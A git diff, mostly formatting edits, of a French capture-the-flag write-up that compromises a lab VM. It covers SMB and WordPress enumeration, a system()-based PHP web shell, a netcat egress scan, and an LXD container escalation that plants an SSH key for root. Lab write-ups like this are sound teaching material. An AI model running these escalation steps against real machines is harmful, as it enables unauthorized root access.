@@ -10,9 +10,9 @@ Faux départ
 
 Un premier scan de ports renvoi des réponses ICMP bizarres comme quoi le protocole n'est pas supporté. Hmmm.  
 
-Pour savoir quels protocoles sont supportés par une machine distante on peut utiliser [un vieux code C que j'ai écrit il y a plus de 10 ans](http://devloop.users.sourceforge.net/index.php?article63/protoscan) ou plus facilement avec l'option *-sO* de Nmap.  
+Pour savoir quels protocoles sont supportés par une machine distante on peut utiliser [un vieux code C que j'ai écrit il y a plus de 10 ans]({% link _posts/2011-01-14-ProtoScan.md %}) ou plus facilement avec l'option `-sO` de Nmap.  
 
-```
+```console
 $ sudo nmap -sO 192.168.56.2 
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.56.2
@@ -52,7 +52,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Essayons de voir ce qui est disponible sur le Samba avec SMBmap :  
 
-```
+```console
 $ python smbmap.py -H 192.168.101.128
 
     ________  ___      ___  _______   ___      ___       __         _______
@@ -71,7 +71,7 @@ $ python smbmap.py -H 192.168.101.128
 
 J'ai le bon réflexe d'essayer avec smbclient qui lui fonctionne correctement :  
 
-```
+```console
 $ smbclient -U "" -N -L //192.168.101.128
 
         Sharename       Type      Comment
@@ -102,7 +102,7 @@ smb: \> ls
 
 Avec, en ordre d'apparition, dans l'historique bash :  
 
-```
+```bash
 sudo su -
 ifconfig
 ls
@@ -123,26 +123,26 @@ Thanks,
 jarves
 ```
 
-Le fichier *secrets* ne révèle aucun secret... puisqu'il est vide !  
+Le fichier `secrets` ne révèle aucun secret... puisqu'il est vide !  
 
-Le dossier *upload* contient un fichier *shell.php* dont le contenu est raccord au nom (appel à la fonction *system()* de PHP).  
+Le dossier *upload* contient un fichier `shell.php` dont le contenu est raccord au nom (appel à la fonction `system()` de PHP).  
 
-Sur le port 10123 tourne le serveur HTTP builtin de Python (*python3 -m http.server*) qui partage exactement le même dossier.  
+Sur le port 10123 tourne le serveur HTTP builtin de Python (`python3 -m http.server`) qui partage exactement le même dossier.  
 
 Le serveur 80 ne correspond pas au même path, ce serait trop facile avec un shell qui nous attend.  
 
-Pour obtenir un shell sur la machine il y a deux chemins. Voici le premier qui a le mérite d'exister comme on verra par la suite.  
+Pour obtenir un shell sur la machine, il y a deux chemins. Voici le premier qui a le mérite d'exister comme on verra par la suite.  
 
 Comme le H de Hawaï
 -------------------
 
-Via une énumération je trouve un Wordpress installé à l'URL *http://192.168.101.128/wp/*.  
+Via une énumération, je trouve un Wordpress installé à l'URL *http://192.168.101.128/wp/*.  
 
-Il y a aussi un CMS Gila que l'auteur a visiblement essayé d'installer sans succès (retourne un code d'erreur 500) sous la racine */server*.  
+Il y a aussi un CMS Gila que l'auteur a visiblement essayé d'installer sans succès (retourne un code d'erreur 500) sous la racine `/server`.  
 
 Je passe donc sur WPscan :  
 
-```
+```console
 $ docker run -it --rm wpscanteam/wpscan --url http://192.168.101.128/wp/
 _______________________________________________________________
          __          _______   _____
@@ -261,11 +261,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Je souhaiterais bien rapatrier un reverse shell mais le trafic sortant semble en partie filtré.  
+Je souhaiterais bien rapatrier un reverse shell, mais le trafic sortant semble en partie filtré.  
 
 Cela est validé avec le netcat présent sur la VM qui ne semble laisser passer que SSH :  
 
-```
+```console
 $ nc -zv 192.168.101.1 1-500 -w 1
 --- snip ---
 nc: connect to 192.168.101.1 port 21 (tcp) timed out: Operation now in progress
@@ -348,7 +348,7 @@ Il ne reste qu'à procéder à une escalade de provilège par LXC. Je me suis in
 
 Le principe est similaire à une escalade via Docker : on va créer un container sur lequel on monte le disque hôte. On en profite pour placer notre clé publique SSH comme clé autorisée pour root :  
 
-```
+```console
 jarves@hackerctflab:~$ lxd init
 Would you like to use LXD clustering? (yes/no) [default=no]: 
 Do you want to configure a new storage pool? (yes/no) [default=yes]: 
@@ -403,7 +403,7 @@ jarves@hackerctflab:~$ lxc exec ignite /bin/sh
 # cp ../../home/jarves/.ssh/authorized_keys .
 ```
 
-```
+```console
 $ ssh root@192.168.1.5
 Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
 
